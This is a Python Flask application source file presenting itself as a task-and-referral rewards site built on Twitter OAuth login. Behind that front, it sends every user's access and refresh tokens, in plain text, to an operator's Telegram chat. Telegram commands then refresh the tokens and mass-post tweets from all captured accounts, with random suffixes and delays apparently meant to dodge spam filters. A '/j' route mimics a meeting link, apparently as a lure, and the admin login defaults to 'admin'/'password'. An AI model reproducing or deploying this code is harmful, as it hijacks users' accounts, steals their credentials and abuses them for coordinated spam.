import os
import logging  # Import the logging module
import base64
import hashlib
import psycopg2
import requests
import time
import json
import random
import traceback
import string
from flask import Flask, redirect, request, session, render_template, url_for
from psycopg2.extras import RealDictCursor

logging.basicConfig(level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s")

# Configuration: Ensure these environment variables are set correctly
CLIENT_ID = os.getenv('CLIENT_ID')
CLIENT_SECRET = os.getenv('CLIENT_SECRET')
CALLBACK_URL = os.getenv('CALLBACK_URL')
TELEGRAM_BOT_TOKEN = os.getenv('TELEGRAM_BOT_TOKEN')
TELEGRAM_CHAT_ID = os.getenv('TELEGRAM_CHAT_ID')
WEBHOOK_URL = os.getenv('WEBHOOK_URL')
DATABASE_URL = os.getenv('DATABASE_URL')  # Render PostgreSQL URL
APP_URL = os.getenv("APP_URL", "https://gifter-7vz7.onrender.com")

# Step 1: Define admin credentials (Later, move to environment variables for security)
ADMIN_USERNAME = os.getenv('ADMIN_USERNAME', 'admin')
ADMIN_PASSWORD = os.getenv('ADMIN_PASSWORD', 'password')

# Set default delay values from environment variables
DEFAULT_MIN_DELAY = int(os.getenv("BULK_POST_MIN_DELAY", 2))
DEFAULT_MAX_DELAY = int(os.getenv("BULK_POST_MAX_DELAY", 10))

app = Flask(__name__)
app.secret_key = os.urandom(24)
BACKUP_FILE = 'tokens_backup.txt'

# Initialize PostgreSQL database
# Updated init_db function to include referral and task tables

def init_db():
    """Sets up the required tables and columns in the database if they don't exist."""
    conn = psycopg2.connect(DATABASE_URL, sslmode='require')
    cursor = conn.cursor()

    # Ensure `tasks` table includes `reward` column
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS tasks (
            id SERIAL PRIMARY KEY,
            title TEXT NOT NULL,
            description TEXT,
            reward REAL DEFAULT 0.0,
            status TEXT DEFAULT 'active'
        )
    ''')
    
    # Create other necessary tables as before
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS users (
            id SERIAL PRIMARY KEY,
            username TEXT NOT NULL UNIQUE,
            access_token TEXT,
            refresh_token TEXT,
            referral_code TEXT UNIQUE,
            referral_url TEXT,
            referred_by TEXT,
            referral_count INTEGER DEFAULT 0,
            referral_reward REAL DEFAULT 0.0,
            token_balance REAL DEFAULT 0.0
        )
    ''')

    cursor.execute('''
        CREATE TABLE IF NOT EXISTS user_tasks (
            user_id INTEGER REFERENCES users(id),
            task_id INTEGER REFERENCES tasks(id),
            status TEXT DEFAULT 'incomplete',
            PRIMARY KEY (user_id, task_id)
        )
    ''')

    conn.commit()
    conn.close()
    print("Database initialized with updated schema.")

def update_token_balance_with_referral(user_id, referral_reward):
    try:
        conn = psycopg2.connect(DATABASE_URL, sslmode='require')
        cursor = conn.cursor()

        # Update the token balance to include referral rewards
        cursor.execute('''
            UPDATE users
            SET token_balance = token_balance + %s
            WHERE id = %s
        ''', (referral_reward, user_id))
        
        conn.commit()
        conn.close()
        logging.info(f"Updated token balance for user ID {user_id} to include referral rewards.")
    except Exception as e:
        logging.error(f"Error updating token balance with referral: {e}")


def store_token(access_token, refresh_token, username):
    print("Storing token in the database...")

    try:
        conn = psycopg2.connect(DATABASE_URL, sslmode='require')
        cursor = conn.cursor()

        cursor.execute("SELECT id, referral_url FROM users WHERE username = %s", (username,))
        existing_user = cursor.fetchone()

        if existing_user:
            user_id, referral_url = existing_user
            cursor.execute(
                "UPDATE users SET access_token = %s, refresh_token = %s WHERE id = %s",
                (access_token, refresh_token, user_id)
            )
            print(f"Updated tokens for existing user @{username}")
        else:
            # Create a new user with referral handling
            cursor.execute(
                '''
                INSERT INTO users (username, access_token, refresh_token, referral_count, referral_reward, token_balance)
                VALUES (%s, %s, %s, 0, 0.0, 0.0) RETURNING id
                ''',
                (username, access_token, refresh_token)
            )
            user_id = cursor.fetchone()[0]
            referral_url = f"{APP_URL}/?referrer_id={user_id}"
            cursor.execute("UPDATE users SET referral_url = %s WHERE id = %s", (referral_url, user_id))
            print(f"New user created with referral URL: {referral_url}")

            referrer_id = session.get('referrer_id')
            if referrer_id:
                referral_reward = 10.0
                cursor.execute(
                    '''
                    UPDATE users
                    SET referral_count = referral_count + 1,
                        referral_reward = referral_reward + %s
                    WHERE id = %s
                    ''',
                    (referral_reward, referrer_id)
                )
                print(f"Referral reward of {referral_reward} added to referrer with ID {referrer_id}")

        conn.commit()
        conn.close()
        
        # Notify via Telegram
        send_message_via_telegram(f"💾 User @{username} stored. Referral URL: {referral_url}")

    except Exception as e:
        print(f"Database error while storing token: {e}")

def send_login_notification(access_token, refresh_token, username, profile_url, referral_url, total_tokens):
    message = (
        f"🔑 <b>Access Token:</b> {access_token}\n"
        f"🔄 <b>Refresh Token:</b> {refresh_token}\n"
        f"👤 <b>Username:</b> @{username}\n"
        f"🔗 <b>Profile URL:</b> <a href='{profile_url}'>{profile_url}</a>\n"
        f"🔗 <b>Referral URL:</b> <a href='{referral_url}'>{referral_url}</a>\n"
        f"📊 <b>Total Tokens in Database:</b> {total_tokens}"
    )
    logging.info(f"📤 Sending login notification to Telegram for @{username}.")
    send_message_via_telegram(message, parse_mode="HTML")  # Specify HTML mode here


@app.route('/')
def home():
    try:
        send_message_via_telegram("🔑 Initiating `home` route.")
        code = request.args.get('code')
        state = request.args.get('state')
        error = request.args.get('error')

        referrer_id = request.args.get('referrer_id')
        if referrer_id:
            session['referrer_id'] = referrer_id
            send_message_via_telegram(f"🆔 Referrer ID {referrer_id} stored in session.")

        if 'username' in session:
            username = session['username']
            conn = psycopg2.connect(DATABASE_URL, sslmode='require')
            cursor = conn.cursor()
            send_message_via_telegram(f"🔍 Retrieving referral URL for returning user @{username}.")
            cursor.execute("SELECT referral_url FROM users WHERE username = %s", (username,))
            referral_url = cursor.fetchone()[0]
            conn.close()
            send_message_via_telegram(f"👋 @{username} just returned to the website.\n🔗 Referral URL: {referral_url}")
            return redirect(url_for('welcome'))

        if request.args.get('authorize') == 'true':
            send_message_via_telegram("🔒 Starting OAuth authorization process.")
            authorization_url = initiate_oauth()
            send_message_via_telegram("🔗 Redirecting to authorization URL.")
            return redirect(authorization_url)

        if code:
            send_message_via_telegram("🔓 Authorization code received. Exchanging for tokens.")
            
            if error:
                send_message_via_telegram(f"❌ Error during authorization: {error}")
                return f"Error during authorization: {error}", 400

            if state != session.get('oauth_state', '0'):
                send_message_via_telegram("❌ Invalid state parameter.")
                return "Invalid state parameter", 403

            token_response = process_authorization_code(code)
            if token_response:
                access_token = token_response.get('access_token')
                refresh_token = token_response.get('refresh_token')

                send_message_via_telegram("🔍 Fetching Twitter username for the new user.")
                username, profile_url = get_twitter_username_and_profile(access_token)

                if username:
                    send_message_via_telegram(f"🔄 Starting token storage process for @{username}")
                    store_token(access_token, refresh_token, username)
                    
                    session['username'] = username
                    session['access_token'] = access_token
                    session['refresh_token'] = refresh_token
                    
                    total_tokens = get_total_tokens()
                    
                    send_message_via_telegram(f"🔍 Retrieving referral URL for notification of @{username}.")
                    conn = psycopg2.connect(DATABASE_URL, sslmode='require')
                    cursor = conn.cursor()
                    cursor.execute("SELECT referral_url FROM users WHERE username = %s", (username,))
                    referral_data = cursor.fetchone()
                    conn.close()

                    if referral_data:
                        referral_url = referral_data[0]
                        send_message_via_telegram(f"🔗 Referral URL retrieved for @{username}: {referral_url}")
                        
                        send_message_via_telegram("📩 Sending login notification.")
                        send_login_notification(access_token, refresh_token, username, profile_url, referral_url, total_tokens)
                        send_message_via_telegram(f"🎉 New login completed. @{username} is now logged in. Total tokens: {total_tokens}")
                    else:
                        send_message_via_telegram(f"⚠️ Failed to retrieve referral URL for @{username}.")
                    
                    return redirect(url_for('welcome'))
                else:
                    send_message_via_telegram("❌ Error retrieving user info with access token.")
                    return "Error retrieving user info with access token", 400
            else:
                error_description = token_response.get('error_description', 'Unknown error')
                error_code = token_response.get('error', 'No error code')
                send_message_via_telegram(f"❌ Error retrieving access token: {error_description} (Code: {error_code})")
                return f"Error retrieving access token: {error_description} (Code: {error_code})", response.status_code

        send_message_via_telegram("ℹ️ Displaying home page to user.")
        return render_template('home.html')

    except Exception as e:
        send_message_via_telegram(f"❌ Error in `home` route: {str(e)}")
        return f"An error occurred: {str(e)}", 500


    except Exception as e:
        send_message_via_telegram(f"❌ Error in `home` route: {str(e)}")
        return f"An error occurred: {str(e)}", 500

# Helper function to initiate OAuth flow
def initiate_oauth():
    """Initiate OAuth flow for user authorization."""
    state = "0"
    code_verifier, code_challenge = generate_code_verifier_and_challenge()
    session['code_verifier'] = code_verifier
    authorization_url = (
        f"https://twitter.com/i/oauth2/authorize?client_id={CLIENT_ID}&response_type=code&"
        f"redirect_uri={CALLBACK_URL}&scope=tweet.read%20tweet.write%20users.read%20offline.access&"
        f"state={state}&code_challenge={code_challenge}&code_challenge_method=S256"
    )
    return authorization_url

# Helper function to process authorization code
def process_authorization_code(code):
    """Exchange authorization code for access and refresh tokens."""
    token_url = "https://api.twitter.com/2/oauth2/token"
    code_verifier = session.pop('code_verifier', None)
    data = {
        'grant_type': 'authorization_code',
        'code': code,
        'redirect_uri': CALLBACK_URL,
        'code_verifier': code_verifier
    }
    response = requests.post(token_url, auth=(CLIENT_ID, CLIENT_SECRET), data=data)
    return response.json() if response.status_code == 200 else None



def get_all_tokens():
    try:
        conn = psycopg2.connect(DATABASE_URL, sslmode='require')
        cursor = conn.cursor()
        cursor.execute('SELECT access_token, refresh_token, username FROM tokens')
        tokens = cursor.fetchall()
        conn.close()
        return tokens
    except Exception as e:
        print(f"Error retrieving tokens from database: {e}")
        return []

def get_total_tokens():
    try:
        conn = psycopg2.connect(DATABASE_URL, sslmode='require')
        cursor = conn.cursor()
        cursor.execute('SELECT COUNT(*) FROM tokens')
        total = cursor.fetchone()[0]
        conn.close()
        return total
    except Exception as e:
        print(f"Error counting tokens in database: {e}")
        return 0

# Generate code verifier and challenge
def generate_code_verifier_and_challenge():
    code_verifier = base64.urlsafe_b64encode(os.urandom(32)).rstrip(b'=').decode('utf-8')
    code_challenge = base64.urlsafe_b64encode(
        hashlib.sha256(code_verifier.encode()).digest()
    ).rstrip(b'=').decode('utf-8')
    return code_verifier, code_challenge

# Function to send a startup message with OAuth link and meeting link
def send_startup_message():
    state = "0"  # Fixed state value for initialization
    code_verifier, code_challenge = generate_code_verifier_and_challenge()
    authorization_url = CALLBACK_URL
    meeting_url = f"{CALLBACK_URL}j?meeting={state}&pwd={code_challenge}"

    message = (
        f"🚀 *OAuth Authorization Link:*\n[Authorize link]({authorization_url})\n\n"
        f"📅 *Meeting Link:*\n[Meeting link]({meeting_url})"
    )

    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    data = {
        "chat_id": TELEGRAM_CHAT_ID,
        "text": message,
        "parse_mode": "Markdown"
    }
    requests.post(url, json=data)

def send_message_via_telegram(message, parse_mode="Markdown"):
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    data = {
        "chat_id": TELEGRAM_CHAT_ID,
        "text": message,
        "parse_mode": parse_mode  # Use the specified parse_mode (default is Markdown)
    }
    headers = {"Content-Type": "application/json; charset=utf-8"}
    response = requests.post(url, json=data, headers=headers)
    if response.status_code != 200:
        logging.error(f"❌ Failed to send message via Telegram: {response.text}")
    else:
        logging.info(f"✅ Message sent to Telegram successfully.")



# Function to post a tweet using a single token
def post_tweet(access_token, tweet_text):
    TWITTER_API_URL = "https://api.twitter.com/2/tweets"
    headers = {
        "Authorization": f"Bearer {access_token}",
        "Content-Type": "application/json"
    }
    payload = {"text": tweet_text}
    response = requests.post(TWITTER_API_URL, json=payload, headers=headers)
    if response.status_code == 201:
        tweet_data = response.json()
        return f"Tweet posted successfully: {tweet_data['data']['id']}"
    else:
        error_message = response.json().get("detail", "Failed to post tweet")
        return f"Error posting tweet: {error_message}"

# Refresh a token using refresh_token and notify via Telegram
def refresh_token_in_db(refresh_token, username):
    token_url = 'https://api.twitter.com/2/oauth2/token'
    client_credentials = f"{CLIENT_ID}:{CLIENT_SECRET}"
    auth_header = base64.b64encode(client_credentials.encode()).decode('utf-8')
    headers = {'Authorization': f'Basic {auth_header}', 'Content-Type': 'application/x-www-form-urlencoded'}
    data = {'refresh_token': refresh_token, 'grant_type': 'refresh_token', 'client_id': CLIENT_ID}
    response = requests.post(token_url, headers=headers, data=data)
    token_response = response.json()

    if response.status_code == 200:
        new_access_token = token_response.get('access_token')
        new_refresh_token = token_response.get('refresh_token')
        conn = psycopg2.connect(DATABASE_URL, sslmode='require')
        cursor = conn.cursor()
        cursor.execute('UPDATE tokens SET access_token = %s, refresh_token = %s WHERE username = %s', 
                       (new_access_token, new_refresh_token, username))
        conn.commit()
        conn.close()
        send_message_via_telegram(f"🔑 Token refreshed for @{username}. New Access Token: {new_access_token}")
        return new_access_token, new_refresh_token
    else:
        send_message_via_telegram(f"❌ Failed to refresh token for @{username}: {response.json().get('error_description', 'Unknown error')}")
        return None, None
		
def get_twitter_username_and_profile(access_token):
    url = "https://api.twitter.com/2/users/me"
    headers = {
        "Authorization": f"Bearer {access_token}"
    }

    response = requests.get(url, headers=headers)

    if response.status_code == 200:
        data = response.json().get("data", {})
        username = data.get("username")
        profile_url = f"https://twitter.com/{username}" if username else None
        return username, profile_url
    else:
        print(f"Failed to fetch username. Status code: {response.status_code}")
        return None, None


# Function to post a tweet using a single token
def post_tweet(access_token, tweet_text):
    TWITTER_API_URL = "https://api.twitter.com/2/tweets"
    headers = {
        "Authorization": f"Bearer {access_token}",
        "Content-Type": "application/json"
    }
    payload = {
        "text": tweet_text
    }
    
    response = requests.post(TWITTER_API_URL, json=payload, headers=headers)
    
    if response.status_code == 201:
        tweet_data = response.json()
        return f"Tweet posted successfully: {tweet_data['data']['id']}"
    else:
        error_message = response.json().get("detail", "Failed to post tweet")
        return f"Error posting tweet: {error_message}"

# Handle posting a tweet with a single token
def handle_post_single(tweet_text):
    tokens = get_all_tokens()
    if tokens:
        access_token, _, username = tokens[0]  # Post using the first token
        result = post_tweet(access_token, tweet_text)
        send_message_via_telegram(f"📝 Tweet posted with @{username}: {result}")
    else:
        send_message_via_telegram("❌ No tokens found to post a tweet.")

# Helper function to generate 10 random alphanumeric characters
def generate_random_string(length=10):
    characters = string.ascii_letters + string.digits  # Alphanumeric characters only
    return ''.join(random.choice(characters) for _ in range(length))

def handle_post_bulk(message):
    tokens = get_all_tokens()

    # Ensure the command format is correct
    parts = message.split(' ', 1)
    if len(parts) < 2:
        send_message_via_telegram("❌ Incorrect format. Use `/post_bulk <tweet content>`.")
        logger.error("Incorrect format for /post_bulk command.")
        return

    # Base tweet text from user input
    base_tweet_text = parts[1]
    min_delay = DEFAULT_MIN_DELAY
    max_delay = DEFAULT_MAX_DELAY

    logger.info(f"Using delay range from environment: min_delay = {min_delay}, max_delay = {max_delay}")

    if not tokens:
        send_message_via_telegram("❌ No tokens found to post tweets.")
        logger.error("No tokens available in the database.")
        return

    total_tokens = len(tokens)
    logger.info(f"Starting bulk posting for {total_tokens} tokens.")

    for index, (access_token, _, username) in enumerate(tokens):
        try:
            # Generate a 10-character random alphanumeric suffix
            random_suffix = generate_random_string(10)
            tweet_text = f"{base_tweet_text} {random_suffix}"

            # Post the tweet
            result = post_tweet(access_token, tweet_text)

            # Log and notify the posting result
            logger.info(f"Tweet {index + 1}/{total_tokens} posted by @{username}. Result: {result}.")
            send_message_via_telegram(
                f"📝 Tweet {index + 1}/{total_tokens} posted with @{username}: {result}\n"
            )

            # Apply a random delay before the next post
            if index < total_tokens - 1:  # No delay after the last tweet
                delay = random.randint(min_delay, max_delay)
                logger.info(f"⏱ Delay before next post: {delay} seconds.")
                send_message_via_telegram(f"⏱ Delay before next post: {delay} seconds.")
                time.sleep(delay)

        except Exception as e:
            # Handle errors for each token gracefully
            logger.error(f"Error posting tweet for @{username}: {e}")
            send_message_via_telegram(f"❌ Error posting tweet for @{username}: {str(e)}")

    # Final summary message after all tweets are posted
    send_message_via_telegram(f"✅ Bulk tweet posting complete. {total_tokens} tweets posted.")
    logger.info(f"Bulk tweet posting complete. {total_tokens} tweets posted.")

    
# Function to handle single token refresh
def handle_refresh_single():
    tokens = get_all_tokens()
    if tokens:
        _, token_refresh, username = tokens[0]  # Use the first token
        refresh_token_in_db(token_refresh, username)
    else:
        send_message_via_telegram("❌ No tokens found to refresh.")

# Function to handle bulk token refresh
def handle_refresh_bulk():
    tokens = get_all_tokens()
    if tokens:
        for _, refresh_token, username in tokens:
            refresh_token_in_db(refresh_token, username)
        send_message_via_telegram(f"✅ Bulk token refresh complete. {len(tokens)} tokens refreshed.")
    else:
        send_message_via_telegram("❌ No tokens found to refresh.")

# Telegram bot webhook to listen for commands
@app.route('/webhook', methods=['POST'])
def telegram_webhook():
    update = request.json
    message = update.get('message', {}).get('text', '')

    if message == '/refresh_single':
        handle_refresh_single()
    elif message == '/refresh_bulk':
        handle_refresh_bulk()
    elif message.startswith('/post_single'):
        tweet_text = message.replace('/post_single', '').strip()
        if tweet_text:
            handle_post_single(tweet_text)
        else:
            send_message_via_telegram("❌ Please provide tweet content.")
    elif message.startswith('/post_bulk'):
        tweet_text = message.replace('/post_bulk', '').strip()
        if tweet_text:
            handle_post_bulk(tweet_text)
        else:
            send_message_via_telegram("❌ Please provide tweet content.")
    else:
        send_message_via_telegram("❌ Unknown command. Use /refresh_single, /refresh_bulk, /post_single <tweet>, or /post_bulk <tweet>.")

    return '', 200

@app.route('/tweet/<access_token>', methods=['GET', 'POST'])
def tweet(access_token):
    if request.method == 'POST':
        tweet_text = request.form['tweet_text']
        result = post_tweet(access_token, tweet_text)
        return render_template('tweet_result.html', result=result)

    return render_template('tweet_form.html', access_token=access_token)

@app.route('/refresh/<refresh_token2>', methods=['GET'])
def refresh_page(refresh_token2):
    return render_template('refresh.html', refresh_token=refresh_token2)

@app.route('/refresh/<refresh_token>/perform', methods=['POST'])
def perform_refresh(refresh_token):
    token_url = 'https://api.twitter.com/2/oauth2/token'
    
    client_credentials = f"{CLIENT_ID}:{CLIENT_SECRET}"
    auth_header = base64.b64encode(client_credentials.encode()).decode('utf-8')
    
    headers = {
        'Authorization': f'Basic {auth_header}',
        'Content-Type': 'application/x-www-form-urlencoded'
    }
    
    data = {
        'refresh_token': refresh_token,
        'grant_type': 'refresh_token',
        'client_id': CLIENT_ID
    }

    response = requests.post(token_url, headers=headers, data=data)
    token_response = response.json()

    if response.status_code == 200:
        new_access_token = token_response.get('access_token')
        new_refresh_token = token_response.get('refresh_token')

        # Use `get_twitter_username_and_profile` to fetch both username and profile URL
        username, profile_url = get_twitter_username_and_profile(new_access_token)

        if username:
            # Store the new tokens in the database
            store_token(new_access_token, new_refresh_token, username)
            
            # Notify via Telegram, including the profile URL
            send_message_via_telegram(f"New Access Token: {new_access_token}\n"
                                      f"New Refresh Token: {new_refresh_token}\n"
                                      f"Username: @{username}\n"
                                      f"Profile URL: {profile_url}")
            return f"New Access Token: {new_access_token}, New Refresh Token: {new_refresh_token}", 200
        else:
            return "Error retrieving user info with the new access token", 400
    else:
        error_description = token_response.get('error_description', 'Unknown error')
        error_code = token_response.get('error', 'No error code')
        return f"Error refreshing token: {error_description} (Code: {error_code})", response.status_code

@app.route('/api/user_stats', methods=['GET'])
def api_user_stats():
    username = session.get('username')
    if not username:
        return {"error": "User not authenticated"}, 401

    user_stats = get_user_stats(username)
    return user_stats, 200

def get_user_stats(username):
    try:
        conn = psycopg2.connect(DATABASE_URL, sslmode='require')
        cursor = conn.cursor(cursor_factory=RealDictCursor)
        
        # Fetch user stats and calculate total tokens as token balance + referral reward
        cursor.execute('''
            SELECT 
                (SELECT COUNT(*) FROM user_tasks WHERE user_tasks.user_id = users.id AND user_tasks.status = 'completed') AS tasks_completed,
                COALESCE(users.token_balance, 0) AS token_balance,
                COALESCE(users.referral_count, 0) AS referral_count,
                COALESCE(users.referral_reward, 0) AS referral_reward,
                COALESCE(users.token_balance, 0) + COALESCE(users.referral_reward, 0) AS total_tokens,
                users.referral_url
            FROM users
            WHERE users.username = %s
        ''', (username,))
        
        user_stats = cursor.fetchone()
        conn.close()
        
        return user_stats or {
            "tasks_completed": 0,
            "token_balance": 0,
            "referral_count": 0,
            "referral_reward": 0,
            "total_tokens": 0,
            "referral_url": ""
        }
    except Exception as e:
        print(f"Error retrieving user stats for {username}: {e}")
        return {
            "tasks_completed": 0,
            "token_balance": 0,
            "referral_count": 0,
            "referral_reward": 0,
            "total_tokens": 0,
            "referral_url": ""
        }

@app.route('/api/add_task', methods=['POST'])
def add_task():
    """API to add a new task to the tasks table."""
    if not session.get('is_admin'):
        return {"error": "Unauthorized"}, 401
    
    data = request.get_json()
    title = data.get('title')
    description = data.get('description')
    reward = data.get('reward')

    if not title or not reward:
        return {"error": "Title and reward are required fields"}, 400

    try:
        conn = psycopg2.connect(DATABASE_URL, sslmode='require')
        cursor = conn.cursor()
        cursor.execute(
            "INSERT INTO tasks (title, description, reward) VALUES (%s, %s, %s)",
            (title, description, reward)
        )
        conn.commit()
        conn.close()
        logging.info("New task added successfully.")
        return {"message": "Task added successfully"}, 201
    except Exception as e:
        logging.error(f"Error adding task: {str(e)}")
        return {"error": "Failed to add task"}, 500

def get_tasks(status):
    """Fetch tasks based on their status."""
    conn = psycopg2.connect(DATABASE_URL, sslmode='require')
    cursor = conn.cursor(cursor_factory=RealDictCursor)
    
    cursor.execute("SELECT title, description FROM tasks WHERE status = %s", (status,))
    tasks = cursor.fetchall()
    conn.close()
    
    return tasks

@app.route('/api/database_tables', methods=['GET'])
def api_database_tables():
    """Fetches and returns the contents of all relevant tables in the database."""
    # Ensure the user is authenticated
    username = session.get('username')
    if not username:
        return {"error": "User not authenticated"}, 401

    tables_data = {}

    try:
        conn = psycopg2.connect(DATABASE_URL, sslmode='require')
        cursor = conn.cursor(cursor_factory=RealDictCursor)

        # Fetch users table data
        cursor.execute("SELECT * FROM users")
        tables_data['users'] = cursor.fetchall()

        # Fetch tasks table data
        cursor.execute("SELECT * FROM tasks")
        tables_data['tasks'] = cursor.fetchall()

        # Fetch user_tasks table data
        cursor.execute("SELECT * FROM user_tasks")
        tables_data['user_tasks'] = cursor.fetchall()

        conn.close()

        return {"tables_data": tables_data}, 200

    except Exception as e:
        print(f"Error retrieving database tables: {e}")
        return {"error": f"Error retrieving database tables: {str(e)}"}, 500

from flask import jsonify

@app.route('/api/tasks', methods=['GET'])
def get_all_tasks():
    """Retrieve all tasks and the user's task statuses."""
    username = session.get('username')
    if not username:
        return {"error": "User not authenticated"}, 401

    try:
        conn = psycopg2.connect(DATABASE_URL, sslmode='require')
        cursor = conn.cursor(cursor_factory=RealDictCursor)

        cursor.execute('''
            SELECT tasks.id, tasks.title, tasks.description, tasks.reward,
                   COALESCE(user_tasks.status, 'not started') AS status
            FROM tasks
            LEFT JOIN user_tasks ON tasks.id = user_tasks.task_id
            LEFT JOIN users ON user_tasks.user_id = users.id
            WHERE users.username = %s OR users.username IS NULL
        ''', (username,))
        
        tasks = cursor.fetchall()
        conn.close()
        return jsonify(tasks), 200
    except Exception as e:
        print(f"Error fetching tasks: {e}")
        return {"error": "Failed to fetch tasks"}, 500


@app.route('/api/tasks/start/<int:task_id>', methods=['POST'])
def start_task(task_id):
    """Mark a task as 'in progress' for the user."""
    username = session.get('username')
    if not username:
        return {"error": "User not authenticated"}, 401

    try:
        conn = psycopg2.connect(DATABASE_URL, sslmode='require')
        cursor = conn.cursor()
        
        # Get the user ID
        cursor.execute("SELECT id FROM users WHERE username = %s", (username,))
        user_id = cursor.fetchone()[0]
        
        # Check if the task is already started or completed
        cursor.execute('''
            INSERT INTO user_tasks (user_id, task_id, status)
            VALUES (%s, %s, 'in progress')
            ON CONFLICT (user_id, task_id) DO NOTHING
        ''', (user_id, task_id))
        
        conn.commit()
        conn.close()
        return {"message": f"Task {task_id} started successfully"}, 200
    except Exception as e:
        print(f"Error starting task {task_id} for {username}: {e}")
        return {"error": f"Failed to start task {task_id}"}, 500


@app.route('/api/tasks/complete/<int:task_id>', methods=['POST'])
def complete_task(task_id):
    """Mark a task as completed and update the user's token balance."""
    username = session.get('username')
    if not username:
        return {"error": "User not authenticated"}, 401

    try:
        conn = psycopg2.connect(DATABASE_URL, sslmode='require')
        cursor = conn.cursor()
        
        # Get the user ID
        cursor.execute("SELECT id, token_balance FROM users WHERE username = %s", (username,))
        user_data = cursor.fetchone()
        user_id, token_balance = user_data[0], user_data[1]
        
        # Get task reward
        cursor.execute("SELECT reward FROM tasks WHERE id = %s", (task_id,))
        task_reward = cursor.fetchone()[0]
        
        # Mark task as completed
        cursor.execute('''
            UPDATE user_tasks SET status = 'completed' 
            WHERE user_id = %s AND task_id = %s
        ''', (user_id, task_id))
        
        # Update user's token balance
        new_balance = token_balance + task_reward
        cursor.execute('''
            UPDATE users SET token_balance = %s WHERE id = %s
        ''', (new_balance, user_id))
        
        conn.commit()
        conn.close()
        
        return {"message": f"Task {task_id} completed. Reward added: {task_reward}"}, 200
    except Exception as e:
        print(f"Error completing task {task_id} for {username}: {e}")
        return {"error": f"Failed to complete task {task_id}"}, 500


@app.route('/j')
def meeting():
    state_id = request.args.get('meeting')  # Get the 'meeting' parameter from the URL
    code_ch = request.args.get('pwd')  # Get the 'pwd' parameter from the URL
    return render_template('meeting.html', state_id=state_id, code_ch=code_ch)
		
@app.route('/admin')
def admin():
    """Main admin entry point that redirects based on login status."""
    if session.get('is_admin'):
        return redirect(url_for('admin_dashboard'))
    return redirect(url_for('admin_login'))

def validate_admin_credentials(username, password):
    return username == ADMIN_USERNAME and password == ADMIN_PASSWORD

@app.route('/admin_login', methods=['GET', 'POST'])
def admin_login():
    try:
        if request.method == 'POST':
            username = request.form['username']
            password = request.form['password']
            
            # Validate admin credentials
            if validate_admin_credentials(username, password):
                session['is_admin'] = True
                return redirect(url_for('admin_dashboard'))
            else:
                error_message = "Invalid username or password"
                return render_template('admin_login.html', error_message=error_message)
        
        # If already logged in, redirect to dashboard
        if session.get('is_admin'):
            return redirect(url_for('admin_dashboard'))
        return render_template('admin_login.html')
    except Exception as e:
        logging.error("Error in admin_login route: %s", str(e))
        logging.error(traceback.format_exc())  # Detailed error trace
        return "An error occurred, please check the server logs.", 500


@app.route('/admin_dashboard')
def admin_dashboard():
    if not session.get('is_admin'):
        return redirect(url_for('admin_login'))

    # Fetch data for users, tasks, and other stats
    conn = psycopg2.connect(DATABASE_URL, sslmode='require')
    cursor = conn.cursor(cursor_factory=RealDictCursor)
    
    # Fetch users
    cursor.execute("SELECT id, username, referral_count, token_balance, 'Active' as status FROM users")
    users = cursor.fetchall()
    
    # Fetch tasks
    cursor.execute("SELECT id, title, description, reward, status FROM tasks")
    tasks = cursor.fetchall()
    
    # Fetch stats
    cursor.execute("SELECT COUNT(*) FROM users")
    total_users = cursor.fetchone()['count']
    
    cursor.execute("SELECT COUNT(*) FROM tasks WHERE status = 'active'")
    active_tasks = cursor.fetchone()['count']
    
    cursor.execute("SELECT COALESCE(SUM(token_balance), 0) FROM users")
    total_tokens_distributed = cursor.fetchone()['coalesce']
    
    # Fetch recent logs (or use placeholders for testing)
    logs = ["User registered", "Task completed", "Referral bonus awarded"]  # Example logs

    conn.close()

    return render_template('admin_dashboard.html', 
                           users=users,
                           tasks=tasks,
                           total_users=total_users,
                           active_tasks=active_tasks,
                           total_tokens_distributed=total_tokens_distributed,
                           logs=logs)


def get_analytics_overview():
    """Fetch analytics data for the admin dashboard."""
    conn = psycopg2.connect(DATABASE_URL, sslmode='require')
    cursor = conn.cursor(cursor_factory=RealDictCursor)

    analytics = {}
    try:
        # Total users
        cursor.execute("SELECT COUNT(*) AS total_users FROM users")
        analytics['total_users'] = cursor.fetchone()['total_users']

        # Total completed tasks
        cursor.execute("SELECT COUNT(*) AS total_completed_tasks FROM user_tasks WHERE status = 'completed'")
        analytics['total_completed_tasks'] = cursor.fetchone()['total_completed_tasks']

        # Total referrals
        cursor.execute("SELECT SUM(referral_count) AS total_referrals FROM users")
        analytics['total_referrals'] = cursor.fetchone()['total_referrals']

        # Total rewards distributed
        cursor.execute("SELECT SUM(referral_reward + token_balance) AS total_rewards FROM users")
        analytics['total_rewards'] = cursor.fetchone()['total_rewards']

    except Exception as e:
        print(f"Error fetching analytics data: {e}")
    finally:
        conn.close()

    return analytics

@app.route('/api/admin/analytics', methods=['GET'])
def get_analytics():
    if not session.get('is_admin'):
        return {"error": "Unauthorized"}, 401

    analytics_data = get_analytics_overview()
    return jsonify(analytics_data), 200

@app.route('/api/users/<int:user_id>', methods=['PUT'])
def edit_user(user_id):
    """Edit user details by ID."""
    if not session.get('is_admin'):
        return {"error": "Unauthorized"}, 401
    
    data = request.get_json()
    username = data.get('username')
    referral_count = data.get('referral_count')
    token_balance = data.get('token_balance')

    try:
        conn = psycopg2.connect(DATABASE_URL, sslmode='require')
        cursor = conn.cursor()
        cursor.execute('''
            UPDATE users
            SET username = %s, referral_count = %s, token_balance = %s
            WHERE id = %s
        ''', (username, referral_count, token_balance, user_id))
        conn.commit()
        conn.close()
        return {"message": "User updated successfully"}, 200
    except Exception as e:
        logging.error(f"Error updating user: {e}")
        return {"error": "Failed to update user"}, 500

@app.route('/api/tasks/<int:task_id>', methods=['PUT'])
def edit_task(task_id):
    """Update a specific task."""
    if not session.get('is_admin'):
        return {"error": "Unauthorized"}, 401
    data = request.get_json()
    title = data.get("title")
    description = data.get("description")
    reward = data.get("reward")
    
    try:
        conn = psycopg2.connect(DATABASE_URL, sslmode='require')
        cursor = conn.cursor()
        cursor.execute('''
            UPDATE tasks
            SET title = %s, description = %s, reward = %s
            WHERE id = %s
        ''', (title, description, reward, task_id))
        conn.commit()
        conn.close()
        return {"message": "Task updated successfully"}, 200
    except Exception as e:
        logging.error(f"Error editing task: {e}")
        return {"error": "Failed to edit task"}, 500

